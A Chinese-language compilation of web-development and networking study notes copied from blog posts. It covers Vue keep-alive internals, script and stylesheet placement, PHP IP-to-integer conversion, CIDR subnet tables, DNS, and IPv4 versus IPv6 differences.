                 callHook(componentInstance, 'mounted')
           }
           if (vnode.data.keepAlive) {
                 if (context._isMounted) {
                     queueActivatedComponent(componentInstance)
                 } else {
                      activateChildComponent(componentInstance, true/* direct */)
                 }
          }
         // ...
     }
}
在这个钩子里面，调用了activateChildComponent函数递归地去执行所有子组件的activated钩子函数：

// src/core/instance/lifecycle.js
export function activateChildComponent (vm: Component, direct?: boolean) {
  if (direct) {
    vm._directInactive = false
    if (isInInactiveTree(vm)) {
      return
    }
  } else if (vm._directInactive) {
    return
  }
  if (vm._inactive || vm._inactive === null) {
    vm._inactive = false
    for (let i = 0; i < vm.$children.length; i++) {
      activateChildComponent(vm.$children[i])
    }
    callHook(vm, 'activated')
  }
}
相反地，deactivated钩子函数也是一样的原理，在组件实例（VNode）的destroy钩子函数中调用deactivateChildComponent函数。
```

### CSS 在头部，JS 在尾部的优化（原理）
```
https://www.cnblogs.com/straybirds/p/11108124.html
css放在头部，js放在尾部优化页面原因：
复制代码
href和src的区别
一般加载CSS用href,并放在头部；加载script用src，放在body内的下方。

href
是hypertext reference的缩写，表示超文本引用，用来建立当前元素和文档间的链接。常用的有link，a。
当CSS使用href引用，浏览器会识别该文档问CSS，并行下载，不会停止对当前文档的加载。

src
是source的缩写，是资源，页面必不可少的一部分，src指向的内容会嵌入到文档中当前标签的位置。常用的有img, script, iframe。
当script使用src引用，浏览器解析到该元素时会停止对文档的渲染，直到该资源加载完成。这也是将script放底部而不是头部的原因。



把CSS放头部，script放下方的原因
CSS放头部
在加载html生成DOM tree的时候，就可以同时对DOM tree进行渲染。
这样可以防止闪跳，白屏或者布局混乱。

javascript放在后面
javascript可能会改变DOM tree的结构，所以需要一个稳定的DOM tree。
javascript加载后会立即执行，同时会阻塞后面的资源加载。（javascript加载和执行的特点）
复制代码
1.首先让我们先认识几个常见的问题：
复制代码
1.在进行页面优化的时候，需要将css放在头部，将js文件放在尾部，这样做为什么能够实现页面的优化?

2.在使用jquery的时候，为什么把函数写在$(document).ready()事件中？

3.javascript会阻塞dom的解析。
当解析过程中遇到<script>标签的时候，便会停止解析过程，转而去处理脚本，
如果脚本是内联的，浏览器会先去执行这段内联的脚本，
如果是外链的，那么先会去加载脚本，然后执行。
在处理完脚本之后，浏览器便继续解析HTML文档。
复制代码
2.DOMContentLoaded函数和load函数解析
复制代码
1.DOMContentLoaded事件其实就是dom内容加载完毕。
举个例子来说我们在打开一个网页的时候，
一开始页面是空白的，什么都看不到，一段事件之后页面展示出内容，但是还是有一些图片资源看不到，此时页面是可以进行正常的交互的，
再过一段时间之后，页面上所有的资源都加载完成，继而整个页面加载完成。
从页面空白到展示出页面内容的过程就会触发DOMContentLoaded事件，而这段事件就是HTML文档被加载和解析完成。
   
2.页面上所有的资源（图片，音频，视频等）被加载以后才会触发load事件，页面的load事件会在DOMContentLoaded被触发之后才触发。
复制代码
3.关于jquery中的ready函数
jquery中的ready函数其实监听的DOMContentLoaded事件，
所以我们将函数写在ready函数中，可以在页面解析完成之后，
我们可以访问到页面所有的元素，缩短页面的交互时间，提高页面的整体体验
4.为什么将css放在头部，js放在尾部可以增加页面的性能
现在浏览器为了更好的用户体验，渲染引擎会尝试尽快在屏幕上显示内容，
它不会等到所有的HTMl元素解析之后在构建和布局dom树，所以部分内容将被解析并显示。
也就是说浏览器能够渲染不完整的dom树和cssom，尽快的减少白屏的时间。
假如我们将js放在header，js将阻塞解析dom，dom的内容会影响到dom树的绘制，导致dom绘制延后。
所以说我们会将js放在后面，以减少dom绘制的时间，但是不会减少DOMContentLoaded被触发的时间。
补充：

DOMContentLoaded与load的区别浏览器加载网页的顺序（如何加快HTML页面加载速度）
```

## 网络篇
### IP 地址转 INT
```
https://www.cnblogs.com/zhshlimi/p/10715911.html
https://www.cnblogs.com/shanyansheng/p/5580232.html
PHP中IP地址与整型数字互相转换详解
这篇文章主要介绍了PHP中IP地址与整型数字互相转换详解,本文介绍了使用PHP函数ip2long与long2ip的使用,以及它们的BUG介绍,最后给出自己写的两个算法,需要的朋友可以参考下

IP转换成整型存储是数据库优化一大趋势，不少人目前存储IP时还在使用字符串类型存储，字符串索引比整型索引消耗资源很多，特别是表中数据量大的时候，以及求查询某一个ip段的数据，今天说的ip是指ip4，ip6不在本文范围内。

系统函数ip2long与long2ip
PHP中有内置函数ip2long可以将ip地址转换整型。

代码如下:

$ip = '210.110.11.49';
echo ip2long($ip);
输出：

-764540111
输出的整型有负号是因为我们得到的结果是有符号整型，有符号整型最大值2147483647，要把结果转换为无符号型可以这么写

3530427185
使用long2ip把整型转换回ip地址

$ip = '210.110.11.49';
$ip_int = ip2long($ip);
echo $ip."<br />";
echo $ip_int."<br />";
echo long2ip($ip_int);
输出：

210.110.011.49
-764540623
210.110.9.49
转换结果不匹配，我们试着在ip第一段数字前加前导0，再看看

$ip = '021.110.11.49';
$ip_int = ip2long($ip);
echo $ip."<br />";
echo $ip_int."<br />";
echo long2ip($ip_int);
输出：

021.110.11.49
292424497
17.110.11.49
转换结果都出错。以上例子都是因为加了前导0后导致转换结果出错，连带逆转结果与原转换ip不匹配。

转换原理

目前有两个算法：
第一、第一段乘以256的三次方，第二段乘以256的平方，第三段乘以256、最后总和

复制代码
$ip = '0210.110.11.49';
 
function ipToInt($ip){
    $iparr = explode('.',$ip);
    $num = 0;
    for($i=0;$i<count($iparr);$i++){
        $num += intval($iparr[$i]) * pow(256,count($iparr)-($i+1));
    }
    return $num;
}
 
echo  $ip.'<br />';
$ip_int = ipToInt($ip);
echo $ip_int.'<br />';
echo long2ip($ip_int);
复制代码
输出：

0210.110.11.49
3530427185
210.110.11.49
第二、通过位运算符

复制代码
$ip = '0210.110.11.49';
 
function ipToInt($ip){
    $iparr = explode('.',$ip);
    return (intval($iparr[0]<<24))|(intval($iparr[1])<<16)|(intval($iparr[2])<<8)| (intval($iparr[3]));
}
 
echo  $ip.'<br />';
$ip_int = ipToInt($ip);
echo $ip_int.'<br />';
echo long2ip($ip_int);
复制代码
输出：

0210.110.11.49
-764540111
210.110.11.49
检测IP是否合法

第一、自己遍历检测

复制代码
function check_ip($ip){
    $iparr = explode('.',$ip);
    foreach($iparr as $v){ if($v>255) return false; }
    return true;
}
 
echo '210.285.11.49,';
var_dump(check_ip('210.285.11.49'));
echo '<br />';
echo '210.205.11.49,';
var_dump(check_ip('210.205.11.49'));
[code]

输出：
[code]
210.285.11.49,bool(false)
210.205.11.49,bool(true)
复制代码
第二、使用ip2long返回

复制代码
function check_ip($ip){
    if(ip2long($ip)) return true;
    return false;
}
 
echo '210.285.11.49,';
var_dump(check_ip('210.285.11.49'));
echo '<br />';
echo '210.205.11.49,';
var_dump(check_ip('210.205.11.49'));
复制代码
输出：

210.285.11.49,bool(false)
210.205.11.49,bool(true)
后记

不少人把ip写库用ip2long转换存放int类型的字段中,但是,在不同的系统平台上,ip2long函数得到的值是不同的,因此可能造成在从数据库中读出数据逆转ip时用long2ip得到的ip与原ip不符合
如果是mysql可以使用mysql系统函数INET_ATON与INET_NTOA解决，或者使用bigint类型处理，要么自己写函数。
```
### 192.168.0.1/16 是什么意思
```
https://blog.csdn.net/aerchi/article/details/39396423?t=1476605876076
网上到处可见IP字段/数字, 例如: 192.168.0.1/24 是什么意思?

首先来了解一下二进制的转换知识：

二进制数转换成十进制数 二进制的1101转化成十进制

1101（2）=1*2^0+0*2^1+1*2^2+1*2^3=1+0+4+8=13

转化成十进制要从右到左用二进制的每个数去乘以2的相应次方.

不过次方要从0开始

相反 用十进制的13除以2 每除一下将余数就记在旁边

最后按余数从下向上排列就可得到1101

十进制转二进制：


用2辗转相除至结果为1
将余数和最后的1从下向上倒序写 就是结果
例如302
302/2 = 151 余0
151/2 = 75 余1
75/2 = 37 余1
37/2 = 18 余1
18/2 = 9 余0
9/2 = 4 余1
4/2 = 2 余0
2/2 = 1 余0
1/2 = 0 余1
故二进制为100101110

子网掩码的前缀表示法！  
11111111 11111111 1111111 00000000  24个1组成    
转成成十进制等于 255.255.255.0    
11111111 11111111 1111111 11111100  30个1组成    
转成成十进制等于 255.255.255.252 
我们租用服务器/vps的时候，买多个IP地址，机房总是发一个类似 10.0.0.1/29 或 10.0.0.1/28 或 10.0.0.1/30 或 10.0.0.1/27 的地址给我们，对于不熟悉网络的人来说，真的莫名其妙。到底有哪些可用的IP？ 网关,子网掩码，广播地址是什么？
为了方便大家，本文章提供了 可用IP查询，ip段/27 /29 /30 网关,子网掩码，广播地址查询
可用IP查询,IP段对应表


 	IP总数	子网掩码	C段个数
/30	4	255.255.255.252	1/64
/29	8	255.255.255.248	1/32
/28	16	255.255.255.240	1/16
/27	32	255.255.255.224	1/8
/26	64	255.255.255.192	1/4
/24	256	255.255.255.0	1
/23	512	255.255.254.0	2
/22	1024	255.255.252.0	4
/21	2048	255.255.248.0	8
/20	4096	255.255.240.0	16
/19	8192	255.255.224.0	32
/18	16384	255.255.192.0	64
/17	32768	255.255.128.0	128
/16	65536	255.255.0.0	256
ip段/24 /25 /26 /27 /28 /29 /30
网关,子网掩码，广播地址查询

范例： 要查询204.45.116.184/29，先找到下表的 /29 表格，网关 这一列找到要查询的IP最后一位即.184，然后就可以看到可用IP范围（注:第一个IP是Gateway网关地址）和广播地址了。然后从上面的表找到 子网掩码即可。

/25 — 2 Subnets — 126 Hosts/Subnet
网络地址	可用IP范围	广播地址
.0	.1-.126	.127
.128	.129-.254	.255
/24 –1 Subnets – 254 Hosts/Subnet
代表一整个C段
网络地址	可用IP范围	广播地址
.0	.1-.254	.255
/30 — 64 Subnets — 2 Hosts/Subnet

网络地址	可用IP范围	广播地址
.0	.1-.2	.3
.4	.5-.6	.7
.8	.9-.10	.11
.12	.13-.14	.15
.16	.17-.18	.19
.20	.21-.22	.23
.24	.25-.26	.27
.28	.29-.30	.31
.32	.33-.34	.35
.36	.37-.38	.39
.40	.41-.42	.43
.44	.45-.46	.47
.48	.49-.50	.51
.52	.53-.54	.55
.56	.57-.58	.59
.60	.61-.62	.63
.64	.65-.66	.67
.68	.69-.70	.71
.72	.73-.74	.75
.76	.77-.78	.79
.80	.81-.82	.83
.84	.85-.86	.87
.88	.89-.90	.91
.92	.93-.94	.95
.96	.97-.98	.99
.100	.101-.102	.103
.104	.105-.106	.107
.108	.109-.110	.111
.112	.113-.114	.115
.116	.117-.118	.119
.120	.121-.122	.123
.124	.125-.126	.127
.128	.129-.130	.131
.132	.133-.134	.135
.136	.137-.138	.139
.140	.141-.142	.143
.144	.145-.146	.147
.148	.149-.150	.151
.152	.153-.154	.155
.156	.157-.158	.159
.160	.161-.162	.163
.164	.165-.166	.167
.168	.169-.170	.171
.172	.173-.174	.175
.176	.177-.178	.179
.180	.181-.182	.183
.184	.185-.186	.187
.188	.189-.190	.191
.192	.193-.194	.195
.196	.197-.198	.199
.200	.201-.202	.203
.204	.205-.206	.207
.208	.209-.210	.211
.212	.213-.214	.215
.216	.217-.218	.219
.220	.221-.222	.223
.224	.225-.226	.227
.228	.229-.230	.231
.232	.233-.234	.235
.236	.237-.238	.239
.240	.241-.242	.243
.244	.245-.246	.247
.248	.249-.250	.251
.252	.253-.254	.255
/26 — 4 Subnets — 62 Hosts/Subnet

网络地址	可用IP范围	广播地址
.0	.1-.62	.63
.64	.65-.126	.127
.128	.129-.190	.191
.192	.193-.254	.255
/27 — 8 Subnets — 30 Hosts/Subnet

网络地址	可用IP范围	广播地址
.0	.1-.30	.31
.32	.33-.62	.63
.64	.65-.94	.95
.96	.97-.126	.127
.128	.129-.158	.159
.160	.161-.190	.191
.192	.193-.222	.223
.224	.225-.254	.255
/28 — 16 Subnets — 14 Hosts/Subnet

网络地址	可用IP范围	广播地址
.0	.1-.14	.15
.16	.17-.30	.31
.32	.33-.46	.47
.48	.49-.62	.63
.64	.65-.78	.79
.80	.81-.94	.95
.96	.97-.110	.111
.112	.113-.126	.127
.128	.129-.142	.143
.144	.145-.158	.159
.160	.161-.174	.175
.176	.177-.190	.191
.192	.193-.206	.207
.208	.209-.222	.223
.224	.225-.238	.239
.240	.241-.254	.255
/29 — 32 Subnets — 6 Hosts/Subnet

网络地址	可用IP范围	广播地址
.0	.1-.6	.7
.8	.9-.14	.15
.16	.17-.22	.23
.24	.25-.30	.31
.32	.33-.38	.39
.40	.41-.46	.47
.48	.49-.54	.55
.56	.57-.62	.63
.64	.65-.70	.71
.72	.73-.78	.79
.80	.81-.86	.87
.88	.89-.94	.95
.96	.97-.102	.103
.104	.105-.110	.111
.112	.113-.118	.119
.120	.121-.126	.127
.128	.129-.134	.135
.136	.137-.142	.143
.144	.145-.150	.151
.152	.153-.158	.159
.160	.161-.166	.167
.168	.169-.174	.175
.176	.177-.182	.183
.184	.185-.190	.191
.192	.193-.198	.199
.200	.201-.206	.207
.208	.209-.214	.215
.216	.217-.222	.223
.224	.225-.230	.231
.232	.233-.238	.239
.240	.241-.246	.247
.248	.249-.254	.255



乐意黎

本文地址: http://blog.csdn.net/aerchi/article/details/39396423
```
### DNS 主要作用是什么？
```
https://www.php.cn/faq/442356.html
DNS是万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析。


dns的功能是什么？

DNS域名系统 (Domain Name System)，它的的作用为，将域名解析为IP 地址，域名和IP地址联系在一起进行服务，这样可不必不用输入IP地址，而是通过输入网址访问网站。

每个IP地址都可以有一个主机名，主机名由一个或多个字符串组成，字符串之间用小数点隔开。有了主机名，就不要死记硬背每台IP设备的IP地址，只要记住相对直观有意义的主机名就行了。这就是DNS协议的功能。



DNS功能映射

1、静态映射，每台设备上都配置主机到IP地址的映射，各设备独立维护自己的映射表，而且只供本设备使用。

2、动态映射，建立一套域名解析系统（DNS），只在专门的DNS服务器上配置主机到IP地址的映射，网络上需要使用主机名通信的设备，首先需要到DNS服务器查询主机所对应的IP地址。

通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。在解析域名时，可以首先采用静态域名解析的方法，如果静态域名解析不成功，再采用动态域名解析的方法。可以将一些常用的域名放入静态域名解析表中，这样可以大大提高域名解析效率。

DNS重要性

1、技术角度看

DNS解析是互联网绝大多数应用的实际寻址方式； 域名技术的再发展、以及基于域名技术的多种应用，丰富了互联网应用和协议。

2、资源角度看

域名是互联网上的身份标识，是不可重复的唯一标识资源； 互联网的全球化使得域名成为标识一国主权的国家战略资源。

DNS查询类型

1、查询方式上分

递归查询：要么做出查询成功的响应，要么做出查询失败的响应。一般客户机和服务器之间属于递归查询，即当客户机向DNS 服务器发出请求后，若DNS服务器本身不能解析，则会向另外的DNS 服务器发出查询的请求，得到结果后转交给客户机。

迭代查询：服务器受到一次迭代查询回复一次结果，这个结果不一定是目标IP 与域名的映射关系，也可以时其他DNS服务器的地址（为了更进一步的获取目标IP）。

2、从查询内容上分

正向查询由域名查询IP 地址。

反向查询由IP 地址查询域名。

```
### IPv4 与 v6 区别
```
https://www.php.cn/windows-414619.html
很多人都听说过IPV4与IPV6，但是不知道IPV4与IPV6的区别是什么？下面php中文网就带领大家来学习一下IPV4与IPV6的区别。
描述 IPv4 IPv6
地址 长度为 32 位（4 个字节）。地址由网络和主机部分组成，这取决于地址类。根据地址的前几位，可定义各种地址类：A、B、C、D 或 E。IPv4 地址的总数为 4 294 967 296。
IPv4 地址的文本格式为 nnn.nnn.nnn.nnn，其中 0<=nnn<=255，而每个 n 都是十进制数。可省略前导零。最大打印字符数为 15 个，不计掩码。

长度为 128 位（16 个字节）。基本体系结构的网络数字为 64 位，主机数字为 64 位。通常，IPv6 地址（或其部分）的主机部分将派生自 MAC 地址或其他接口标识。
根据子网前缀，IPv6 的体系结构比 IPv4 的体系结构更复杂。

IPv6 地址的数目比 IPv4 地址的数目大 1028（79 228 162 514 264 337 593 543 950 336）倍。IPv6 地址的文本格式为 xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx，其中每个 x 都是十六进制数，表示 4 位。可省略前导零。可在地址的文本格式中使用一次双冒号（::），用于指定任意数目的 0 位。例如，::ffff:10.120.78.40 表示 IPv4 映射的 IPv6 地址。

地址分配 最初，按网络类分配地址。随着地址空间的消耗，使用“无类域间路由”（CIDR）进行更小的分配。没有在机构和国家或地区之间平均分配地址。 分配尚处于早期阶段。“因特网工程任务组织”（IETF ）和“因特网体系结构委员会”（IAB）建议基本上为每个组织、家庭或实体分配一个 /48 子网前缀长度。它将保留 16 位供组织进行子网划分。地址空间是足够大的，可为世界上每个人提供一个其自己的 /48 子网前缀长度。
地址生存期 通常，除使用 DHCP 分配的地址之外，此概念不适用于 IPv4 地址。 IPv6 地址有两个生存期：首选生存期和有效生存期，而首选的生存期总是小于等于有效的生存期。
首选生存期到期后，如果有同样好的首选地址可用，那么该地址便不再用作新连接的源 IP 地址。 有效生存期到期后，该地址不再用作入局信息包的有效目标 IP 地址或源 IP 地址。

根据定义，某些 IPv6 地址有无限多个首选生存期和有效生存期，如本地链路）。

地址掩码 用于从主机部分指定网络。 未使用。
地址前缀 有时用于从主机部分指定网络。有时根据地址的表示格式写为 /nn 后缀。 用于指定地址的子网前缀。按照打印格式写为 /nnn（最多 3 位十进制数字，0 <= nnn <= 128）后缀。例如 fe80::982:2a5c/10，其中前 10 位组成子网前缀。
地址解析协议（ARP） IPv4 使用 ARP 来查找与 IPv4 地址相关联的物理地址（如 MAC 或链路地址）。 IPv6 使用因特网控制报文协议版本 6（ICMPv6）将这些功能嵌入到 IP 自身作为无状态自动配置和邻节点发现算法的一部分。因此，不存在类似于 ARP6 之类的东西。
地址作用域 此概念不适用于单点广播地址。有指定的专用地址范围和回送地址。将该范围之外的地址假设为全局地址。
在 IPv6 中，地址作用域是该体系结构的一部分。单点广播地址有两个已定义的作用域，包括本地链路和全局链路；而多点广播地址有 14 个作用域。为源和目标选择缺省地址时要考虑作用域。

作用域区域是特定网络中作用域的实例。因此，有时必须输入 IPv6 地址或使它与区域标识相关联。语法是 %zid，其中 zid 是一个数字（通常较小）或名称。区域标识写在地址之后前缀之前。 例如，2ba::1:2:14e:9a9b:c%3/48。

地址类型 IPv4 地址分为三种基本类型：单点广播地址、多点广播地址和广播地址。 IPv6 地址分为三种基本类型：单点广播地址、多点广播地址和任意广播地址。
通信跟踪 通信跟踪是一个收集进入和离开系统的 TCP/IP（及其他）信息包的详细跟踪资料的工具。 同样支持 IPv6。
配置 新安装的系统必须在进行配置之后才能与其他系统通信；即，必须分配 IP 地址和路由。 根据所需的功能，配置是可选的。IPv6 可与任何以太网适配器配合使用并且可通过回送接口运行。IPv6 接口是使用 IPv6 无状态自动配置进行自我配置的。还可手工配置 IPv6 接口。这样，根据网络的类型以及是否存在 IPv6 路由器，系统将能与其他本地和远程的 IPv6 系统通信。
域名系统（DNS） 应用程序使用套接字 API gethostbyname() 接受主机名，然后使用 DNS 来获得 IP 地址。
应用程序还接受 IP 地址，然后使用 DNS 和 gethostbyaddr() 获得主机名。

对于 IPv4，逆向查找域为 in-addr.arpa。

同样支持 IPv6。使用 AAAA（四个 A）记录类型和逆向查找（IP 到名称）支持 IPv6。应用程序可选择（是否）从 DNS 接受 IPv6 地址，然后（是否）使用 IPv6 进行通信。
套接字 API gethostbyname() 仅支持 IPv4。对于 IPv6，使用新的 getaddrinfo() API 以仅获取 IPv6 或获取 IPv4 和 IPv6 地址（在应用选择上）。

对于 IPv6，用于逆向查找的域为 ip6.arpa，如果找不到，那么会使用 ip6.int。

动态主机配置协议（DHCP） DHCP 用于动态获取 IP 地址及其他配置信息。IBM i 支持对 IPv4 使用 DHCP 服务器。 通过 IBM i 实现的 DHCP 不支持 IPv6。但是，可以使用 ISC DHCP 服务器实现。
文件传输协议（FTP） FTP 允许通过网络发送和接收文件。 同样支持 IPv6。
片段 如果一个信息包对于要传送它的下一链路来说太大，那么可由发送方（主机或路由器）对其分段。 对于 IPv6，只能在源节点进行分段，且只能在目标节点完成重新装配。使用分段扩展报头。
主机表 将因特网地址与主机名关联的可配置表，例如，127.0.0.1 用于回送。在开始 DNS 查找之前或者 DNS 查找失败之后（由主机名搜索优先级确定），套接字名称解析器将使用此表。 同样支持 IPv6。
IBM Navigator for i支持 IBM Navigator for i提供完整的 TCP/IP 配置解决方案。 同样支持 IPv6。
接口 概念性或逻辑实体，由 TCP/IP 用来发送和接收信息包，即使不以 IPv4 地址命名也始终与 IPv4 地址紧密关联。有时称为逻辑接口。
可使用 IBM Navigator for i以及使用 STRTCPIFC 和 ENDTCPIFC 命令彼此独立并独立于 TCP/IP 启动和停止 IPv4 接口。

同样支持 IPv6。
因特网控制报文协议（ICMP） 由 IPv4 用来进行网络信息通信。 由 IPv6 的使用情况类似；然而，因特网控制报文协议版本 6（ICMPv6）提供一些新的属性。
保留了基本错误类型，如目标不可到达、回传请求和应答。 添加了新的类型和代码以支持邻节点发现和相关的功能。

因特网组管理协议（IGMP） IGMP 由 IPv4 路由器用来查找需要特定多点广播组通信的主机，并由 IPv4 主机用来向 IPv4 路由器通告（主机上）现有的多点广播组侦听器。 IGMP 在 IPv6 中由 MLD（多播侦听器发现）协议取代。MLD 执行 IGMP 对 IPv4 所执行的必要操作，但通过添加一些特定于 MLD 的 ICMPv6 类型值来使用 ICMPv6。
IP 报头 根据提供的 IP 选项，有 20-60 个字节的可变长度。 40 个字节的固定长度。没有 IP 报头选项。通常，IPv6 报头比 IPv4 报头简单。
IP 报头选项 IP 报头（在任何传输报头之前）可能附带各种选项。 IPv6 报头没有选项。而 IPv6 添加了附加（可选）的扩展报头。扩展报头包括 AH 和 ESP（和 IPv4 的一样）、逐跳扩展、路由、分段和目标。目前，IPv6 支持一些扩展报头。
IP 报头协议字节 传输层或信息包有效负载的协议代码，例如，ICMP。 报头类型紧跟在 IPv6 报头后面。使用与 IPv4 协议字段相同的值。此结构的作用是允许以后的报头使用当前定义的范围并且易于扩展。下一个报头将是传输报头、扩展报头或 ICMPv6。
IP 报头“服务类型”字节 由 QoS 和差别服务用来指定通信类。 但使用不同的代码来指定 IPv6 流量类。目前，IPv6 不支持 TOS。
LAN 连接 LAN 连接由 IP 接口用来到达物理网络。存在许多类型，例如，令牌环和以太网。有时，它称为物理接口、链路或线路。 IPv6 可与任何以太网适配器配合使用并且可通过虚拟以太网在逻辑分区间使用。
第 2 层隧道协议（L2TP） 可将 L2TP 看作是虚拟 PPP，并通过任何支持的线路类型工作。 同样支持 IPv6。
回送地址 回送地址是地址为 127.*.*.*（通常是 127.0.0.1）的接口，只能由节点用来向自身发送信息包。该物理接口（线路描述）被命名为 *LOOPBACK。 与 IPv4 的概念相同。单个回送地址为 0000:0000:0000:0000:0000:0000:0000:0001 或 ::1（简短版本）。虚拟物理接口被命名为 *LOOPBACK。
最大传输单元（MTU） 链路的最大传输单元是特定链路类型（如以太网或调制解调器）支持的最大字节数。对于 IPv4，最小值一般为 576。 IPv6 的 MTU 下限为 1280 个字节。也就是说，IPv6 不会在低于此极限时对信息包分段。要通过字节数小于 1280 的 MTU 链路发送 IPv6，链路层必须以透明方式对 IPv6 信息包进行分段及合并。
Netstat Netstat 是一个用于查看 TCP/IP 连接、接口或路由状态的工具。在使用 IBM Navigator for i和字符界面时可用。 同样支持 IPv6。
网络地址转换（NAT） 集成到 TCP/IP 中的基本防火墙功能，是使用 IBM Navigator for i配置的。 目前，NAT 不支持 IPv6。通常，IPv6 不需要 NAT。IPv6 扩展了地址空间，这样就解决了地址短缺问题并使重新编号变得更加容易。
网络表 IBM Navigator for i上一个将网络名称与无掩码的 IP 地址相关联的可配置表。例如，主机网络 14 与 IP 地址 1.2.3.4。 对于 IPv6，目前此表不变。
节点信息查询 不存在。 一种简易的网络工具，其工作方式应类似于 ping，只是内容不同：IPv6 节点可查询目标 DNS 名称的另一个 IPv6 节点、IPv6 单点广播地址或 IPv4 地址。 目前不受支持。
开放式最短路径优先协议（OSPF） OSPF 是在优先于 RIP 的较大型自治系统网络中使用的路由器协议。 同样支持 IPv6。
信息包过滤 信息包过滤是集成到 TCP/IP 中的基本防火墙功能。它是通过使用 IBM Navigator for i配置的。 信息包过滤不支持 IPv6。
信息包转发
可将 IBM i TCP/IP 堆栈配置为转发其接收到的非本地 IP 地址的 IP 信息包。通常，入站接口和出站接口各自连接到不同的 LAN。

信息包转发对 IPv6 的支持有限。IBM i TCP/IP 堆栈不支持作为路由器而执行的邻节点发现。

PING PING 是测试可达性的基本 TCP/IP 工具。在使用 IBM Navigator for i和字符界面时可用。 同样支持 IPv6。
点到点协议（PPP） PPP 支持基于各种调制解调器和线路类型的拨号接口。 同样支持 IPv6。
端口限制 IBM Navigator for i 允许客户配置已选择的 TCP 或用户数据报协议 (UDP) 端口号或端口号范围，以便其只对特定概要文件可用。 IPv6 的端口限制与 IPv4 的端口限制完全相同。
端口 TCP 和 UDP 有独立的端口空间，分别由范围为 1-65535 之间的端口号标识。 对于 IPv6，端口的工作与 IPv4 相同。因为它们处于新地址系列，现在有四个独立的端口空间。 例如，有应用程序可绑定的两个 TCP 端口 80 空间，一个在 AF_INET 中，一个在 AF_INET6 中。
专用地址和公用地址 除由 IETF RFC 1918 指定为专用的三个地址范围 10.*.*.* (10/8)、172.16.0.0 至 172.31.255.255 (172.16/12) 和 192.168.*.* (192.168/16) 之外，所有 IPv4 地址都是公用的。专用地址域通常在组织内部使用。专用地址不能通过因特网路由。 IPv6 有类似的概念，但还有重要差别。
地址是公用或临时的，先前称为匿名地址。 请参阅 RFC 3041。与 IPv4 专用地址不同，临时地址可进行全局路由。动机也不一样：IPv6 临时地址要在它开始通信时屏蔽其客户机的身份（涉及隐私）。临时地址的生存期有限，且不包含是链路（MAC）地址的接口标识。它们通常与公用地址没有区别。

IPv6 具有受限地址作用域的概念，它使用其设计的作用域指定。

协议表 在 IBM Navigator for i中，协议表是将协议名称与其分配的协议号关联（例如，将 UDP 与 17 关联）的可配置表。随系统交付的只有少量的项：IP、TCP、UDP 和 ICMP。 该表可与 IPv6 直接配合使用而不需要更改。
服务质量（QoS） 服务质量允许为 TCP/IP 应用程序请求信息包优先级和带宽。 目前，通过 IBM i 实现的 QoS 不支持 IPv6。
重新编号 重新编号通过手工重新配置完成，可能存在 DHCP 的例外情况。通常，对于站点或组织，重新编号是应尽可能避免的复杂且烦琐的过程。 重新编号是 IPv6 的一个重要结构元素，特别是在 /48 前缀中已很大程度上实现自动化。
路由 从逻辑上讲，是一组 IP 地址（可能只包含 1 个）的映射，这些 IP 地址映射为物理接口和单个下一中继段 IP 地址。使用该线路将其目标地址定义为该组的一部分的 IP 信息包转发至下一中继段。IPv4 路由与 IPv4 接口关联，因此，它是一个 IPv4 地址。
缺省路由为 *DFTROUTE。

从概念上讲，与 IPv4 类似。一个重要差别是：IPv6 路由与物理接口（链路，如 ETH03）而不是接口相关联（绑定）。路由与物理接口相关联的一个原因是 IPv6 与 IPv4 的源地址选择功能不同。

路由信息协议（RIP） RIP 是路由守护程序支持的路由协议。 目前，RIP 不支持 IPv6。
服务表
IBM i 上的一个可配置表，它将服务名称与端口和协议关联（例如，将服务名称 FTP 与端口 21、TCP 及用户数据报协议（UDP）关联）。

服务表中列示了大量众所周知的服务。许多应用程序使用此表来确定要使用哪个端口。

对于 IPv6，此表不变。
简单网络管理协议（SNMP） SNMP 是一个用于系统管理的协议。 同样支持 IPv6。
套接字 API 应用程序通过使用这些 API 来使用 TCP/IP。不需要 IPv6 的应用程序不受为支持 IPv6 所做的套接字更改的影响。 IPv6 使用新的地址系列：AF_INET6 增强了套接字以便应用程序现在可使用 IPv6。
设计了这些增强以便现有的 IPv4 应用程序完全不受 IPv6 和 API 更改的影响。希望支持并发 IPv4 和 IPv6 通信或纯 IPv6 通信的应用程序可以容易地适应使用 IPv4 映射的 IPv6 地址格式 ::ffff:a.b.c.d，其中 a.b.c.d 是客户机的 IPv4 地址。

新的 API 还支持从文本至二进制及从二进制至文本的 IPv6 地址转换。

源地址选择 应用程序可指定源 IP（通常，使用套接字 bind()）。如果它绑定至 INADDR_ANY，那么根据路由来选择源 IP。 与 IPv4 一样，应用程序可使用 bind() 指定源 IPv6 地址。和 IPv4 类似，它可通过使用 in6addr_any 让系统选择 IPv6 源地址。但是，因为 IPv6 线路有许多 IPv6 地址，所以选择源 IP 的内部方法不同。
启动和停止 请使用 STRTCP 或 ENDTCP 命令来启动或结束 IPv4。当运行 STRTCP 命令来启动 TCP/IP 时，IPv4 始终处于启动状态。 请使用 STRTCP 或 ENDTCP 命令的 STRIP6 参数来启动或结束 IPv6。当 TCP/IP 已启动时，IPv6 可能未启动。稍后，可独立启动 IPv6。
如果 AUTOSTART 参数设置为 *YES（缺省值），那么任何 IPv6 接口都会自动启动。IPv6 必须与 IPv4 配合使用或配置。当启动 IPv6 时，会自动定义并激活 IPv6 回送接口 ::1。

Telnet Telnet 允许登录并使用远程计算机，就好象直接与其连接一样。 同样支持 IPv6。
跟踪路由 跟踪路由是进行路径确定的基本 TCP/IP 工具。在使用 IBM Navigator for i和字符界面时可用。 同样支持 IPv6。
传输层 TCP、UDP 和 RAW。 IPv6 中存在相同的传输。
未指定地址 顾名思义，未定义的地址。套接字编程将 0.0.0.0 用作 INADDR_ANY。 定义为 ::/128（128 个 0 位）。 它在某些邻节点发现信息包和各种其他的上下文（如套接字）中用作源 IP。套接字编程将 ::/128 用作 in6addr_any。
虚拟专用网络（VPN） 虚拟专用网络（使用 IPsec）允许在现有的公用网络上扩展安全的专用网络。
同样支持 IPv6。

以上就是IPV4与IPV6的区别（史上最详细）的详细内容，更多请关注php中文网其它相关文章！
```

## 网络编程篇

### TCP 三次握手流程

```
https://blog.csdn.net/xuezhiwu001/article/details/78587439
三次握手流程的本质，可以这么理解：TCP的三次握手其实是双方各一次握手，各一次确认，只是其中一次握手和确认合并在一起。
